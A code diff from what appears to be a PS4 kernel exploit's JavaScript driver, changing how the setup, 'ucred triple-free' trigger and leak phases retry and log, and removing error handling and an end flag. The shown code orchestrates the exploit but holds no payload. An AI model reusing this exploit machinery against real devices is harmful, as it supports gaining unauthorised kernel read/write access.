@@ -938,17 +938,10 @@ function netctrl_exploit() {
   yield_to_render(exploit_phase_setup);
 }
 function exploit_phase_setup() {
-  if (exploit_end) return;
-  var ok = false;
-  try {
-    ok = setup();
-  } catch (e) {
-    ok = false;
-  }
+  var ok = setup();
   if (!ok) {
-    log('Setup failed — aborting.');
+    log('Setup failed, aborting exploit.');
     cleanup();
-    exploit_end = true;
     return;
   }
   log('Workers spawned');
@@ -957,28 +950,19 @@ function exploit_phase_setup() {
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
-  if (exploit_end) return;
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Max attempts reached — stopping.');
+    log('Failed to acquire kernel R/W');
     log('Restart your ps4 ########');
     cleanup();
-    exploit_end = true;
     return;
   }
   exploit_count++;
-  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
-  var ok = false;
-  try {
-    ok = trigger_ucred_triplefree();
-  } catch (e) {
-    ok = false;
-  }
-  if (!ok) {
-    log('Trigger failed — retrying...');
+  log('Triggering ..... ');
+  if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  log('Leaking...');
+  log('Leaking .....');
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
@@ -990,7 +974,7 @@ function exploit_phase_leak() {
     ok = false;
   }
   if (!ok) {
-    log('Leak failed — retrying triggering...');
+    log('Leaking Failed......');
     log('Retry triggering...');
     yield_to_render(exploit_phase_trigger);
     return;
